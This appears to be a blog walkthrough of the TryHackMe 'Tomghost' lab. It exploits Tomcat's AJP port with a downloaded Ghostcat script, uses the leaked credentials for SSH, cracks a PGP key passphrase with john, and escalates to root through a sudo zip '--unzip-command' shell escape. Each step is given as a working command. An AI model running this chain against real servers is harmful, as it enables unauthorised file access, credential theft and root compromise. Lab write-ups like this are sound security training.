---
published: true
image: 'https://imgur.com/7DNKTEN.png'
title: Tomghost - TryHackMe Walkthrough
category: Writeup
author: F3dai
---
Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [tomghost](https://tryhackme.com/room/tomghost)

**Difficulty:** Easy

**Author:** stuxnet

### Enumeration

We are given the IP 10.10.31.90. Run an nmap scan with the following command:

<pre>nmap -p- -A -o portscan 10.10.31.90</pre>

These are the open ports:

<pre>PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
</pre>

![nmap](https://imgur.com/XW4ayyE.png)

Here is port 8080 on my browser:

![8080](https://imgur.com/kdAPeyb.png)

This seems to just be the Apache installation index page.

I have never seen port **8009** open, so I will investigate this. 

**AJP** is a wire protocol. It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. 

By default, Apache Tomcat listens on 3 ports, 8005, 8009 and 8080. A common misconfiguration is blocking port 8080 but leaving ports 8005 or 8009 open for public access. 

I will be using this tool on github to exploit this vulnerability:

[00theway/Ghostcat-CNVD-2020-10487](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

Let's download the raw code onto our local machine:

<pre>wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py</pre>

![wget](https://imgur.com/CJZL2Na.png)

We have the script ajpShooter.py.

This is the command to read a file:

<pre>python3 ajpShooter.py http://10.10.31.90:8080 8009 /WEB-INF/web.xml read</pre>

![read](https://imgur.com/j3oj3eg.png)

There are some credentials:

<pre>skyfuck:8********************s</pre>

We saw earlier that port 22 was open, let's try and ssh using the credentials we just discovered. The password seems to just be plaintext, I don't recognise any encryption. 

<pre>ssh skyfuck@10.10.31.90</pre>

![ssh](https://imgur.com/SfpNmCF.png)

We are successfully logged in as skyfuck.

The home directory has another user called merlin. We also have the user flag.

<pre>cd ..
ls
cd merlin
cat user.txt</pre>

![flag](https://imgur.com/Ngw5qJq.png)

### Privilege Escalation

I noticed a pgp file in skyfuck's home directory:

![pgp](https://imgur.com/kXqdDE9.png)

We also have tryhackme.asc which has a PGP PRIVATE KEY BLOCK:

![asc](https://imgur.com/vETDGxm.png)

I will transfer these files to my local machine so I can attempt to decrypt  the file.

<pre>scp skyfuck@10.10.31.90:/home/skyfuck/* .</pre>

scp is a way to transfer files across a network using ssh. Read more about this here:

[Secure Copy - ssh scp](https://www.ssh.com/ssh/scp/)

Here is a youtube video explaining how to crack a PGP Private Key Password.

[John the Ripper: How to Recover Your PGP Private Key Password](https://www.youtube.com/watch?v=DBpd9e4tJfg)

We will be converting the tryhackme.asc file using the tool gpg2john.

<pre>gpg2john tryhackme.asc > hash</pre>

This is what my hash file contains:

<pre>tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme &lt;stuxnet@tryhackme.com&gt;::tryhackme.asc</pre>

Now let's use john to crack this file. I used the rockyou.txt wordlist.

<pre>john --wordlist=/usr/share/wordlists/rockyou.txt hash</pre>

We have some results:

![results john](https://imgur.com/kuPdKLu.png)

Now that we have this key, let's go back to the ssh session and decrypt the pgp key. 

<pre>gpg --import tryhackme.asc
gpg --decrypt credential.pgp</pre>

![decrypt](https://imgur.com/LwOh5bw.png)

We have some credentials:

<pre>merlin:a*************************************************************j</pre>

Change the user and use those credentials:

<pre>su merlin</pre>

![su](https://imgur.com/a7xv8d4.png)

Check to see the users sudo rights:

<pre>sudo -l</pre>

![sudo l](https://imgur.com/idjo6X1.png)

We need to priv esc using the zip binary. I did some research on ZIP Privilege Escalation and found this article:

[ZIP exploitation](https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/)

So let's create a new file with touch:

<pre>touch f3dai.txt</pre>

Then exploit this using the following command:

<pre>sudo zip 1.zip f3dai.txt -T --unzip-command="sh -c /bin/bash"</pre>

![zip exploit](https://imgur.com/DHkbYYo.png)

We have spawned a root shell, and found the root flag.
